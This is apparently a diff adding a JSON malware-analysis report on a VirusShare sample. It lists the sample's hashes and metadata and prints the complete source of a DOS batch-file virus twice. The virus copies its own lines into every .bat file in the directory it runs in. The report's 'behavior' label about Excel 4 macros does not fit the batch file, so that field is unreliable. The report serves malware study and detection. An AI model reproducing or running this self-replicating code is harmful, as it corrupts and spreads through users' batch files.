@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@ECHO OFF>nul.ViRuS\nif \"%1==\"/ViRuS_THE_PROCEDURE goto ViRuS_the_procedure\nfor %%a in (*.bat) do call %0 /ViRuS_THE_PROCEDURE %%a\ngoto ViRuS_OLDBAT\n:ViRuS_the_procedure\nfind \"ViRuS\" <%0.bat >xViRuSx.bat\nfind /v \"ViRuS\" <%2 |find /v \":XXX_END\" >>xViRuSx.bat\necho :XXX_END>>xViRuSx.bat\ncopy xViRuSx.bat %2>nul\ndel xViRuSx.bat>nul.ViRuS\ngoto XXX_END>nul.ViRuS\n:ViRuS_OLDBAT\nECHO ON>nul.ViRuS\necho This is the dummy original batch\n:XXX_END"
+    },
+    "filename": "VirusShare_38996d70cebb9c9243bd04bdc4f21761",
+    "filesize": 449,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "38996d70cebb9c9243bd04bdc4f21761",
+        "sha1": "2d584d8a6639953ca2cfec144a324ea080331b4c",
+        "sha256": "8c068a713996a393ed5d68aa12087e70f94fde36e8ea405993db995d7352e2bf"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ECHO OFF>nul.ViRuS",
+            "if \"%1==\"/ViRuS_THE_PROCEDURE goto ViRuS_the_procedure",
+            "for %%a in (*.bat) do call %0 /ViRuS_THE_PROCEDURE %%a",
+            "goto ViRuS_OLDBAT",
+            ":ViRuS_the_procedure",
+            "find \"ViRuS\" <%0.bat >xViRuSx.bat",
+            "find /v \"ViRuS\" <%2 |find /v \":XXX_END\" >>xViRuSx.bat",
+            "echo :XXX_END>>xViRuSx.bat",
+            "copy xViRuSx.bat %2>nul",
+            "del xViRuSx.bat>nul.ViRuS",
+            "goto XXX_END>nul.ViRuS",
+            ":ViRuS_OLDBAT",
+            "ECHO ON>nul.ViRuS",
+            "echo This is the dummy original batch",
+            ":XXX_END"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.253395",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
